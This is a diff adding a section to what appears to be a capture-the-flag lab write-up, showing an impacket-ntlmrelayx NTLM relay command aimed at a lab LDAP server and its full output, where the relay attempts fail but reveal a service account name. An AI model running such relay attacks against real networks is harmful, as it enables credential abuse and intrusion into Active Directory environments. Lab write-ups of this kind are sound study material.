@@ -221,6 +221,64 @@ mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare
                                                                  
 ```
 
+```
+impacket-ntlmrelayx -t ldap://10.129.189.74 --http-port 8888 -smb2support
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client SMB loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 8888
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Setting up MSSQL Server on port 1433
+[*] Setting up RDP Server on port 3389
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
+[*] (HTTP): Client requested path: /healthcheck
+[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
+[*] (HTTP): Client requested path: /healthcheck
+[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
+[*] (HTTP): Client requested path: /healthcheck
+[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
+[*] (HTTP): Client requested path: /healthcheck
+[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
+[*] (HTTP): Client requested path: /healthcheck
+[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
+^C                                                                                      
+```
+
+Attack failed but discovered a user
 ## nslookup
 
 ```
